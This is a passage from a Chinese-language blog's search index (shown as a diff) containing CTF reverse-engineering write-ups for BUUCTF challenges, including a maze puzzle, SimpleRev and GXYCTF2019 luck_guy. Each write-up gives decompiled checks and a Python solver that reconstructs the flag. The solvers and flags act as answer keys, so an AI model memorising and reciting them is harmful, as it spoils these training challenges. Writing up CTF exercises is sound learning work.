+<p><strong>Result：</strong>可以查看Str2字符串值（追踪Str2），推出来输入的值（先base64加密 后每一位加上下标）</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-05.png"></p>
+<p><strong>payload：</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span></span><br><span class="line">str1 = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    str1 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(data[i]) - i)</span><br><span class="line">flag = base64.b64decode(str1)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Buu-不一样的flag-迷宫题"><a href="#Buu-不一样的flag-迷宫题" class="headerlink" title="Buu - 不一样的flag [ 迷宫题 ]"></a>Buu - 不一样的flag [ 迷宫题 ]</h2><p>32位无壳，用ida打开，看到一串数字和上下左右（猜测是迷宫题）</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-00.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-01.png"></p>
+<p>选中 <code>&#39;49&#39;</code>换成字符 -&gt; R键将Ascii换成对应字符</p>
+<p>-&gt; 如果是1 就退出</p>
+<p>-&gt; 如果是# 你输入的序列就是flag</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">*1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#</span><br><span class="line">下下下右右上上右右下下下</span><br><span class="line">222441144222</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>5*5列，从*开始，1,2,3,4对应上下左右 走到#</p>
+</blockquote>
+<h2 id="Buu-SimpleRev-字节序-真是逆向了"><a href="#Buu-SimpleRev-字节序-真是逆向了" class="headerlink" title="Buu - SimpleRev [ 字节序 真是逆向了 ]"></a>Buu - SimpleRev [ 字节序 真是逆向了 ]</h2><p>字节的排列方式有两个通用规则： <a class="link" href="https://www.ruanyifeng.com/blog/2022/06/endianness-analysis.html">学习了解字节序00 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>                    <a class="link" href="https://www.ruanyifeng.com/blog/2016/11/byte-order.html">学习了解字节序01 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>大端序</strong> - 数据的低位字节放在内存的高位地址，高位字节存放在低位地址</p>
+<p><strong>小端序</strong> - 低位放在低地址，高位放在高地址</p>
+<p><strong>CPU读取内存中的数据时，是从低地址向高地址方向进行读取的</strong></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-02.png"></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i ) <span class="comment">// v5是key的长度</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; key[v3 % v5] &lt;= <span class="string">&#x27;Z&#x27;</span> ) <span class="comment">// 判断key中的每个元素是不是大写字母</span></span><br><span class="line">    key[i] = key[v3 % v5] + <span class="number">32</span>;	<span class="comment">// 如果是，将那一位 加上32 =&gt; 变成对应的小写字母</span></span><br><span class="line">  ++v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )	<span class="comment">// 小写字母范围</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> ) <span class="comment">// 大写字母范围</span></span><br><span class="line">    &#123;</span><br><span class="line">      str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>; <span class="comment">// 下面这些就有点懵逼了了</span></span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">  ++v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>还要对Ascii码熟悉点</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-03.png"></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">text = <span class="string">&quot;killshadow&quot;</span></span><br><span class="line">key = <span class="string">&quot;adsfkndcls&quot;</span></span><br><span class="line">dic = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>((<span class="built_in">ord</span>(j) - <span class="number">39</span> - <span class="built_in">ord</span>(key[i]) + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>) == text[i]:</span><br><span class="line">            flag += j</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        s = <span class="number">9180147350284624745LL</span>;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>case4：将s字符串赋值给f2</p>
+<p>case5：对于f2字符串，如果是奇数位 -2；如果是偶数位 -1</p>
+<p>case1：f1已知，f2是上面得到的，两个拼接 就是s</p>
+</blockquote>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">f1 = <span class="string">&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x7f</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>] <span class="comment">#逆序 [ 字节序 小端序 ]</span></span><br><span class="line"><span class="comment"># 0x7F666F6067756369</span></span><br><span class="line">flag = f1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(key)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(key[i] - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(key[i] - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <categories>
+        <category>Reverse</category>
+      </categories>
+      <tags>
+        <tag>Reverse</tag>
       </tags>
   </entry>
 </search>
